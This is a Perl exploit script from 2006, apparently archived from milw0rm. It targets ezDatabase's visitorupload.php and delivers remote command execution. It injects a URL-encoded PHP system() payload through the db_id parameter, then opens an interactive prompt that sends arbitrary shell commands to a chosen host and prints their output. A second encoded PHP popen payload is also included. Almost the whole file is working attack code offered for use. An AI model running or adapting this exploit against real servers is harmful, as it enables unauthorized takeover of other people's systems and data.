#!/usr/bin/perl
#
# ezDatabase Remote Command Execution Exploit
# based on advisory by Pridels Team
#
# Copyright (c) 2006 cijfer <cijfer@netti!fi>
# All rights reserved.
#
# never ctrl+c again.
# cijfer$ http://target.com/dir
# host changed to 'http://target.com/dir'
# cijfer$ 
#
# $Id: cijfer-ezdbxpl.pl,v 0.1 2006/01/21 019:22:00 cijfer Exp $

use LWP::UserAgent;
use URI::Escape;
use Getopt::Long;
use Term::ANSIColor;

$res  = GetOptions("host=s" => \$host, "proxy=s" => \$proxy, "verbose+" => \$verbose);
&usage unless $host;

while()
{
	print color("green"), "cijfer\$ ", color("reset");
	chomp($command = <STDIN>);
	exit unless $command;
	if($command =~ m/^http\:\/\/(.*)/g)
	{
		$host="http://".$1;
		print "host changed to '";
		print color("bold"), $host."'\n", color("reset");
	}
	&exploit($command,$host);
}

sub usage
{
	print "ezDatabase Remote Command Execution Exploit\n";
	print "Usage: $0 -hp [OPTION]...\n\n";
	print "  -h --host\tfull address of target (ex. http://www.website.com/directory)\n";
	print "  -p --proxy\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
	print "  -v --verbose\tverbose mode\n\n";
	exit;
}

sub exploit
{
	my($command,$host) = @_;

	$cij=LWP::UserAgent->new() or die;
	$cij->agent("Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101");
	$cij->proxy("http", "http://".$tunnel."/") unless !$proxy;

	$string  = "%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B";
	$string .= uri_escape(shift);
	$string .= "%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F";
	$execut  = "%3C%3F%24%68%61%6E%64%6C%65%3D%70%6F%70%65%6E";
	$execut .= "%5C%28%24%5F%47%45%54%5B%63%69%6A%5D%2C%22%72";
	$execut .= "%22%29%3B%77%68%69%6C%65%28%21%66%65%6F%66%28";
	$execut .= "%24%68%61%6E%64%6C%65%29%29%7B%24%6C%69%6E%65";
	$execut .= "%3D%66%67%65%74%73%28%24%68%61%6E%64%6C%65%29";
	$execut .= "%3B%69%66%28%73%74%72%6C%65%6E%28%24%6C%69%6E";
	$execut .= "%65%29%3E%3D%31%29%7B%65%63%68%6F%22%24%6C%69";
	$execut .= "%6E%65%22%3B%7D%7D%70%63%6C%6F%73%65%28%24%68";
	$execut .= "%61%6E%64%6C%65%29%3B%3F%3E";

	$out=$cij->get($host."/visitorupload.php?db_id=%3b%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%63%6d%64%5d%29&cmd=".$string);

	if($out->is_success)
	{
		@cij=split("_cijfer_",$out->content);
		print substr(@cij[1],1);
	}
	if($verbose)
	{
		$recv=length $out->content;
		print "Total received bytes: ".$recv."\n";
		$sent=length $command;
		print "Total sent bytes: ".$sent."\n";
	}
}

# milw0rm.com [2006-01-22]
